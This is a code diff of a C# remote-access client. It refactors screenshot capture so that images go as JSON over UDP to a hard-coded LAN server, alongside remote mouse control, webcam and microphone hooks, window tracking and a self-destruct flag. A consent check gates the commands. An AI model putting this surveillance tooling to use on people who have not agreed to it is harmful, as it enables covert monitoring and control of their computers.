@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Net;
@@ -17,34 +18,12 @@ using RemoteClient.Camera;
 using RemoteClient.Core;
 using Encoder = System.Drawing.Imaging.Encoder;
 using Timer = System.Threading.Timer;
+using System.Text.Json;
 
 namespace RemoteClient
 {
     public class RemoteClient
     {
-        [StructLayout(LayoutKind.Sequential)]
-        public struct RECT
-        {
-            public int Left;
-            public int Top;
-            public int Right;
-            public int Bottom;
-        }
-        [DllImport("user32.dll")]
-        private static extern bool SetForegroundWindow(IntPtr hWnd);
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetWindowDC(IntPtr hWnd);
-
-        [DllImport("gdi32.dll")]
-        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
-            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, CopyPixelOperation rop);
-
-        [DllImport("user32.dll")]
-        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
-        [DllImport("user32.dll")]
-        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
         private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         private const uint MOUSEEVENTF_LEFTUP = 0x0004;
         private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
@@ -52,47 +31,45 @@ namespace RemoteClient
         private const string ServerIp = "192.168.1.11";
         private static NetworkStream ns;
         private static TcpClient server;
+        private readonly bool distruct = false;
         private BinaryWriter bWrite;
-        // private ChatForm chatForm;
         private Thread chatThread;
         private int depth = 70;
         private Dispatcher dispatcher;
-        
-        private UdpClient udpClient;
-        private IPEndPoint serverEndPoint;
-        private Timer remoteControlTimer;
-        private bool isRemoteControlActive;
-        private int remoteControlQuality = 100;
 
-
-        private readonly bool distruct = false;
         private FoundInfoSyncHandler FoundInfo;
-        // private ClipHook hookboard;
         private bool isfile, arun;
+        private bool isRemoteControlActive;
+
         private TreeNode node;
-        // private DeviceNotification notifier;
+
         private bool olReceived, shot = false;
         private Thread realTimeScreenShootThread;
         private Thread realTimeTrackerThread;
+        private int remoteControlQuality = 100;
+        private Timer remoteControlTimer;
 
         // Add these fields at the class level
         private bool remoteInteractionEnabled = true;
         private int screenShootUpdateTime = 100; //10 fps
+        private readonly IPEndPoint serverEndPoint;
+        private readonly IPEndPoint realTimeEndPoint;
         private ThreadEndedSyncHandler ThreadEnded;
         private ActiveWindowTracker tracker;
+
+        private readonly UdpClient udpClient;
         private WaveInEvent waveIn;
         private Webcam webcam;
         
-        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);
-
-        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
+        private const int RC_UDP_PORT = 4444;
+        private const int RTL_UDP_PORT = 8765;
 
 
         public RemoteClient()
         {
-            // Initialize UDP client and server endpoint
             udpClient = new UdpClient();
-            serverEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), 4444);
+            serverEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), RC_UDP_PORT);
+            realTimeEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), RTL_UDP_PORT);
             FoundInfo += this_FoundInfo;
             ThreadEnded += this_ThreadEnded;
 
@@ -112,6 +89,22 @@ namespace RemoteClient
             }
         }
 
+        [DllImport("user32.dll")]
+        private static extern bool SetForegroundWindow(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetWindowDC(IntPtr hWnd);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
+            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, CopyPixelOperation rop);
+
+        [DllImport("user32.dll")]
+        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("user32.dll")]
+        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
+
 
 // P/Invoke declarations
         [DllImport("user32.dll")]
@@ -119,6 +112,20 @@ namespace RemoteClient
 
         [DllImport("user32.dll")]
         private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
+        
+        private static T DeserializeData<T>(byte[] data) where T : class
+        {
+            try
+            {
+                var jsonString = System.Text.Encoding.UTF8.GetString(data);
+                return JsonSerializer.Deserialize<T>(jsonString);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error deserializing data: {ex.Message}");
+                return null;
+            }
+        }
 
         private void agent_exit(object sender, EventArgs e)
         {
@@ -424,7 +431,7 @@ namespace RemoteClient
             if (!ConsentManager.ConsentGiven)
                 return;
             var o = (DataObject)ob;
-            
+
             if (o.CommandType == "RTL")
             {
                 if (o.CommandName == "RTASTART")
@@ -452,81 +459,83 @@ namespace RemoteClient
                     Program.Unhook();
                 }
             }
-           else if (o.CommandType == "ProcessScreenshot")
-           {
-               if (o.CommandName == "Capture")
-                   try
-                   {
-                       string processId = o.CommandData is object[] dataArray
-                           ? dataArray[0].ToString()
-                           : o.CommandData.ToString();
-           
-                       Debug.WriteLine($"Taking optimized screenshot for process: {processId}");
-           
-                       // Get screen dimensions
-                       Rectangle bounds = Screen.PrimaryScreen.Bounds;
-                       int width = bounds.Width;
-                       int height = bounds.Height;
-           
-                       // Create a scaled down version for faster transmission
-                       int scaledWidth = width / 2;  // 50% of original width
-                       int scaledHeight = height / 2; // 50% of original height
-           
-                       using (Bitmap fullBmp = new Bitmap(width, height))
-                       using (Graphics g = Graphics.FromImage(fullBmp))
-                       {
-                           g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
-           
-                           // Create scaled bitmap
-                           using (Bitmap scaledBmp = new Bitmap(scaledWidth, scaledHeight))
-                           using (Graphics scaledG = Graphics.FromImage(scaledBmp))
-                           {
-                               // Set high speed, lower quality interpolation
-                               scaledG.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
-                               scaledG.DrawImage(fullBmp, 0, 0, scaledWidth, scaledHeight);
-           
-                               byte[] imageBytes;
-                               using (var ms = new MemoryStream())
-                               {
-                                   // Use lower JPEG quality and scaled image for faster transmission
-                                   using (var encoderParams = new EncoderParameters(1))
-                                   using (var qualityParam = new EncoderParameter(Encoder.Quality, 50L))
-                                   {
-                                       var jpegCodec = GetEncoderInfo("image/jpeg");
-                                       encoderParams.Param[0] = qualityParam;
-                                       scaledBmp.Save(ms, jpegCodec, encoderParams);
-                                       imageBytes = ms.ToArray();
-                                   }
-                               }
-           
-                               SendMessage(new DataObject
-                               {
-                                   CommandType = "ProcessScreenshot",
-                                   CommandName = "Result",
-                                   CommandData = new object[] 
-                                   { 
-                                       processId, 
-                                       imageBytes,
-                                       new Size(scaledWidth, scaledHeight) // Send scaled dimensions
-                                   }
-                               });
-           
-                               Debug.WriteLine($"Optimized screenshot sent ({imageBytes.Length} bytes) for process: {processId}");
-                           }
-                       }
-                   }
-                   catch (Exception ex)
-                   {
-                       Debug.WriteLine($"Error taking screenshot: {ex.Message}");
-                       SendMessage(new DataObject
-                       {
-                           CommandType = "ProcessScreenshot",
-                           CommandName = "Error",
-                           CommandData = new object[] { o.CommandData.ToString(), ex.Message }
-                       });
-                   }
-           }
-           
+            else if (o.CommandType == "ProcessScreenshot")
+{
+    if (o.CommandName == "Capture")
+    try
+    {
+        string processId = o.CommandData is object[] dataArray 
+            ? dataArray[0].ToString() 
+            : o.CommandData.ToString();
+
+        Debug.WriteLine($"Taking optimized screenshot for process: {processId}");
+
+        // Get screen dimensions
+        Rectangle bounds = Screen.PrimaryScreen.Bounds;
+        int width = bounds.Width;
+        int height = bounds.Height;
+
+        // Create a scaled down version for faster transmission
+        int scaledWidth = width / 2;
+        int scaledHeight = height / 2;
+
+        using (Bitmap fullBmp = new Bitmap(width, height))
+        using (Graphics g = Graphics.FromImage(fullBmp))
+        {
+            g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
+
+            using (Bitmap scaledBmp = new Bitmap(scaledWidth, scaledHeight))
+            using (Graphics scaledG = Graphics.FromImage(scaledBmp))
+            {
+                scaledG.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
+                scaledG.DrawImage(fullBmp, 0, 0, scaledWidth, scaledHeight);
+
+                byte[] imageBytes;
+                using (var ms = new MemoryStream())
+                {
+                    using (var encoderParams = new EncoderParameters(1))
+                    using (var qualityParam = new EncoderParameter(Encoder.Quality, 50L))
+                    {
+                        var jpegCodec = GetEncoderInfo("image/jpeg");
+                        encoderParams.Param[0] = qualityParam;
+                        scaledBmp.Save(ms, jpegCodec, encoderParams);
+                        imageBytes = ms.ToArray();
+                    }
+                }
+
+                var screenshotData = new ScreenshotData
+                {
+                    ProcessId = processId,
+                    ImageBytes = imageBytes,
+                    ImageSize = new Size(scaledWidth, scaledHeight)
+                };
+
+                // Serialize to JSON
+                var jsonData = screenshotData.ToJson();
+
+                byte[] udpData = System.Text.Encoding.UTF8.GetBytes(jsonData);
+                udpClient.Send(udpData, udpData.Length, realTimeEndPoint);
+
+                Debug.WriteLine($"Optimized screenshot sent ({imageBytes.Length} bytes) for process: {processId}");
+            }
+        }
+    }
+    catch (Exception ex)
+    {
+        Debug.WriteLine($"Error taking screenshot: {ex.Message}");
+
+        var errorData = new
+        {
+            ProcessId = o.CommandData.ToString(),
+            Error = ex.Message
+        };
+
+        string jsonError = JsonSerializer.Serialize(errorData);
+        byte[] udpErrorData = System.Text.Encoding.UTF8.GetBytes(jsonError);
+        udpClient.Send(udpErrorData, udpErrorData.Length, realTimeEndPoint);
+    }
+}
+
             else if (o.CommandType == "Webcam")
             {
                 if (o.CommandName == "List")
@@ -559,7 +568,7 @@ namespace RemoteClient
             {
                 if (o.CommandName == "show") ShowMessage(o.CommandData);
             }
-            
+
             else if (o.CommandType == "Mouse")
             {
                 MouseParser(o.CommandData, bool.Parse(o.CommandName));
@@ -800,7 +809,7 @@ namespace RemoteClient
                 LogError(e.ToString());
             }
         }
-        
+
         public static void SendMessage(object msg)
         {
             if (ConsentManager.ConsentGiven) ThreadPool.QueueUserWorkItem(SendNow, msg);
@@ -906,10 +915,8 @@ namespace RemoteClient
                 isRemoteControlActive = true;
                 SendScreenInfo();
                 if (remoteControlTimer == null)
-                {
                     remoteControlTimer = new Timer(
                         _ => SendScreenToServer(), null, 0, 200); // 5 fps
-                }
             }
             catch (Exception ex)
             {
@@ -954,12 +961,14 @@ namespace RemoteClient
             if (!isRemoteControlActive) return;
             try
             {
-                using (var screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
+                using (var screenshot =
+                       new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                 {
                     using (var g = Graphics.FromImage(screenshot))
                     {
                         g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                     }
+
                     var resized = screenshot;
                     var maxWidth = 1280;
                     if (screenshot.Width > maxWidth)
@@ -967,6 +976,7 @@ namespace RemoteClient
                         var newHeight = (int)(screenshot.Height * ((float)maxWidth / screenshot.Width));
                         resized = new Bitmap(screenshot, new Size(maxWidth, newHeight));
                     }
+
                     using (var ms = new MemoryStream())
                     {
                         var encoderParams = new EncoderParameters(1);
@@ -1005,7 +1015,7 @@ namespace RemoteClient
             {
                 if (obj == null)
                     return null;
-                var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+                var bf = new BinaryFormatter();
                 using (var ms = new MemoryStream())
                 {
                     bf.Serialize(ms, obj);
@@ -1072,6 +1082,18 @@ namespace RemoteClient
             return null;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        public struct RECT
+        {
+            public int Left;
+            public int Top;
+            public int Right;
+            public int Bottom;
+        }
+
+        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);
+
+        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
     }
 
 
@@ -1131,7 +1153,8 @@ namespace RemoteClient
 
         [DllImport("gdi32.dll")]
         public static extern IntPtr CreateDIBSection(IntPtr hdc,
-            [In] [MarshalAs(UnmanagedType.LPStruct)] BITMAPINFO pbmi,
+            [In] [MarshalAs(UnmanagedType.LPStruct)]
+            BITMAPINFO pbmi,
             uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);
 
         [StructLayout(LayoutKind.Sequential)]
